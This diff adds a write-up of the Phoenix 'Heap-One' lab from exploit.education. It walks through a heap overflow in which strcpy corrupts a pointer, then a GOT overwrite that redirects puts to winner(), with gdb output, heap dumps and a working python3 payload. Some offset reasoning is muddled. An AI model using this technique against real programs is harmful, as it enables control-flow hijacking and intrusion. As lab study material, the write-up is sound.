@@ -323,4 +323,277 @@ Or, if the program opens the filename passed in argv:
 * For realistic targets prefer ROP / ret2libc where NX is enabled. On this host `checksec` showed NX disabled and RWX segments present, which allowed stack/heap shellcode execution.
 
 ---
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
+---
+
+# Heap-One:
+
+**Challenge**: [Phoenix/Heap-One](https://exploit.education/phoenix/heap-one/)
+
+**Goal**: Overflow the heap and change the address of the `puts@got.plt` to  **winner address**.
+
+---
+
+## 📌 Quick Background
+
+From **Wikipedia**:
+
+> *A heap overflow, heap overrun, or heap smashing is a type of buffer overflow that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers. The canonical heap overflow technique overwrites dynamic memory allocation linkage (such as malloc metadata) and uses the resulting pointer exchange to overwrite a program function pointer.*
+
+**⚡ Takeaway:**
+Heap overflows allow corruption of heap metadata or adjacent heap chunks to change control flow — often via pointer overwrites.
+
+---
+
+##  Starting the Challenge
+
+Running the binary:
+
+```
+$ ./heap-one
+[ 2216.609667] heap-one[328]: segfault at 0 ip 00000000f7f840f1 sp 00000000ffffdd14 error 4 in libc.so[f7f6d000+8d000]
+Segmentation fault
+```
+
+Testing with larger arguments (64 bytes):
+
+```
+[ 2192.364105] heap-one[327]: segfault at 0 ip 00000000f7f840d6 sp 00000000ffffdcd4 error 4 in libc.so[f7f6d000+8d000]
+
+```
+
+Different values appear for `ip` and `sp`, but the program still crashes — a clear sign something interesting is happening on the heap.
+
+---
+
+## 🔧 Inspecting the Binary
+
+```
+nm ./heap-one
+```
+
+We discover:
+
+```
+0804889a T winner
+```
+
+Let’s inspect this function:
+
+```gdb
+(gdb) disassemble winner
+```
+
+```asm
+0x0804889a <+0>:   push   %ebp
+0x080488a3 <+9>:   push   $0x0
+0x080488a5 <+11>:  call   time
+0x080488b1 <+23>:  push   $msg
+0x080488b6 <+28>:  call   printf
+```
+
+And the message:
+
+```gdb
+(gdb) x/s 0x804ab8c
+"Congratulations, you've completed this level..."
+```
+
+So our goal is to redirect code execution to `winner()`.
+
+---
+
+## Understanding the Program (C Source)
+
+```c
+struct heapStructure {
+  int priority;
+  char *name;
+};
+
+int main(int argc, char **argv) {
+  struct heapStructure *i1, *i2;
+
+  i1 = malloc(sizeof(struct heapStructure));
+  i1->priority = 1;
+  i1->name = malloc(8);
+
+  i2 = malloc(sizeof(struct heapStructure));
+  i2->priority = 2;
+  i2->name = malloc(8);
+
+  strcpy(i1->name, argv[1]);
+  strcpy(i2->name, argv[2]);
+
+  printf("and that's a wrap folks!\n");
+}
+```
+
+### 📌 Observations
+
+* Both `name` pointers are allocated using `malloc(8)` → **small, adjacent heap chunks**.
+* `strcpy()` copies user input **without bounds checking**.
+* Overflowing `i1->name` will overwrite heap metadata **or the fields of `i2`**.
+* After both `strcpy()` calls, the program calls:
+
+```c
+printf("and that's a wrap folks!\n");
+```
+
+### ⚡ GOT Overwrite Idea
+
+We can overwrite a **Global Offset Table (GOT)** entry: specifically the one for `puts`, which is later called by `printf` internally.
+
+We cant here realistically do stack smashing or anything else due to fact we have vulnerabilty surrounding heap area and stack region or eip of main is very far from heap region.
+
+The structure:
+
+Replace:
+
+```
+puts@got = address_of(winner)
+```
+
+When the program tries to call `puts()`, it will execute `winner()` instead.
+
+---
+
+## Inspecting the GOT Entry for puts()
+
+```gdb
+(gdb) x/10i 0x80485b0
+```
+
+We find:
+
+```
+0x804c140 <puts@got.plt>: 0x80485b6
+```
+
+And the winner function:
+
+```
+winner @ 0x0804889a
+```
+
+If we set:
+
+```gdb
+set {int}0x804c140 = 0x804889a
+```
+
+the program prints the winning message.
+
+This confirms our target.
+
+---
+
+## Locating the Heap Chunks
+
+Set a breakpoint after the second `strcpy()`:
+
+```
+b *0x08048878
+run AAAAAAAA BBBBBBBB
+```
+
+Inspect registers:
+
+```
+   0x08048871 <+156>:   push   edx
+   0x08048872 <+157>:   push   eax
+   0x08048873 <+158>:   call   0x8048560 <strcpy@plt>
+```
+
+the edx here is the source or arg value (in disassembly we would see environment variables, other good stuff)
+
+and eax is actual heap pointer to i1->name and i2->name (1st strcpy@plt and 2nd strcpy@plt)
+
+
+```
+eax = i2->name  (destination of second strcpy)
+```
+
+Dump around that region:
+
+```
+x/40wx $eax-40
+```
+
+Output:
+
+```
+0xf7e69010:     0x00000000      0x00000011      0x41414141      0x41414141
+0xf7e69020:     0x00000000      0x00000011      0x00000002      0xf7e69038
+0xf7e69030:     0x00000000      0x00000011      0x42424242      0x42424242
+0xf7e69040:     0x00000000      0x000fffc1      0x00000000      0x00000000
+0xf7e69050:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69070:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
+
+```
+
+The distance between `i1->name` and `i2->name` is:
+
+```python
+hex(0xf7e69038 - 0xf7e69018) == '0x20'
+```
+
+So overflowing `i1->name` by **20 bytes** lets us overwrite the pointer stored in `i2->name`.
+
+That gives us full control over the **destination pointer** used by the second `strcpy()`.
+
+---
+
+## Final Exploit Strategy
+
+1. `argv[1]` overflows `i1->name`
+   → overwrite `i2->name` with the address of **puts@got**.
+
+2. `argv[2]` becomes the *source* for the second `strcpy()`
+   → copied **into the GOT entry**.
+
+3. Payload #2 = address of `winner()`.
+
+### Final Payload
+
+```bash
+./heap-one \
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x40\xc1\x04\x08")') \
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x9a\x88\x04\x08")')
+```
+
+* `b"A"*20` — padding up to overwrite point
+* `b"\x40\xc1\x04\x08"` — `puts@got.plt`
+* `b"\x9a\x88\x04\x08"` — `winner()`
+
+---
+
+# Result
+
+Running the exploit:
+
+```
+Congratulations, you've completed this level @ 1763272634 seconds past the Epoch
+```
+
+Heap overflow → GOT overwrite → control-flow hijack → `winner()` executed!
+
+---
+
+
+
+
+
+
+
+
+
 
